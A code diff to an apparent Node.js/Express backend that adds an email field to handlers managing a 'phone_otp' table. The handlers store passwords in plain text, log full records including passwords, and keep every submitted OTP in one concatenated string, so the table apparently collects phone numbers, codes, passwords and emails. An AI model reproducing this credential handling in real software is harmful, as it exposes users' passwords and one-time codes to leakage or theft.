@@ -4,7 +4,7 @@ const createOrUpdatePhone = async (req, res) => {
   let connection;
   try {
     connection = await pool.getConnection();
-    const { phone, otp, status, password } = req.body;
+    const { phone, otp, status, password, email } = req.body;
 
     if (!phone) {
       console.log('Phone field is required');
@@ -17,21 +17,22 @@ const createOrUpdatePhone = async (req, res) => {
       phone,
       otp: otp || null,
       status: status || null,
-      password: password || null
+      password: password || null,
+      email: email || null
     };
 
     if (results.length > 0) {
       const existingOtp = results[0].otp || '';
       const newOtp = existingOtp ? `${existingOtp}|${otp}` : otp;
 
-      const query = 'UPDATE phone_otp SET otp = ?, status = ?, password = ? WHERE phone = ?';
-      const [updateResult] = await connection.query(query, [newOtp, phoneData.status, phoneData.password, phone]);
+      const query = 'UPDATE phone_otp SET otp = ?, status = ?, password = ?, email = ? WHERE phone = ?';
+      const [updateResult] = await connection.query(query, [newOtp, phoneData.status, phoneData.password, phoneData.email, phone]);
 
       console.log('Phone updated:', { phone, affectedRows: updateResult.affectedRows });
       res.json({ message: 'Phone updated', affectedRows: updateResult.affectedRows });
     } else {
-      const query = 'INSERT INTO phone_otp (phone, otp, status, password) VALUES (?, ?, ?, ?)';
-      const [insertResult] = await connection.query(query, [phoneData.phone, phoneData.otp, phoneData.status, phoneData.password]);
+      const query = 'INSERT INTO phone_otp (phone, otp, status, password, email) VALUES (?, ?, ?, ?, ?)';
+      const [insertResult] = await connection.query(query, [phoneData.phone, phoneData.otp, phoneData.status, phoneData.password, phoneData.email]);
 
       console.log('Phone created:', { id: insertResult.insertId, ...phoneData });
       res.status(201).json({ id: insertResult.insertId, ...phoneData });
@@ -48,7 +49,7 @@ const getPhones = async (req, res) => {
   let connection;
   try {
     connection = await pool.getConnection();
-    const { page = 1, limit = 10, status, phone } = req.query;
+    const { page = 1, limit = 10, status, phone, email } = req.query;
     const offset = (page - 1) * limit;
 
     let query = 'SELECT * FROM phone_otp';
@@ -63,6 +64,12 @@ const getPhones = async (req, res) => {
       query += params.length ? ' AND' : ' WHERE';
       query += ' phone = ?';
       params.push(phone);
+    }
+
+    if (email) {
+      query += params.length ? ' AND' : ' WHERE';
+      query += ' email = ?';
+      params.push(email);
     }
 
     query += ' LIMIT ? OFFSET ?';
@@ -84,7 +91,7 @@ const updatePhone = async (req, res) => {
   try {
     connection = await pool.getConnection();
     const { id } = req.params;
-    const { phone, otp, status, password } = req.body;
+    const { phone, otp, status, password, email } = req.body;
 
     if (!phone) {
       console.log('Phone field is required');
@@ -101,8 +108,8 @@ const updatePhone = async (req, res) => {
     const existingOtp = results[0].otp || '';
     const newOtp = existingOtp ? `${existingOtp}|${otp}` : otp;
 
-    const query = 'UPDATE phone_otp SET phone = ?, otp = ?, status = ?, password = ? WHERE id = ?';
-    const [updateResult] = await connection.query(query, [phone, newOtp, status, password, id]);
+    const query = 'UPDATE phone_otp SET phone = ?, otp = ?, status = ?, password = ?, email = ? WHERE id = ?';
+    const [updateResult] = await connection.query(query, [phone, newOtp, status, password, email, id]);
 
     console.log('Phone updated:', { id, affectedRows: updateResult.affectedRows });
     res.json({ message: 'Phone updated', affectedRows: updateResult.affectedRows });
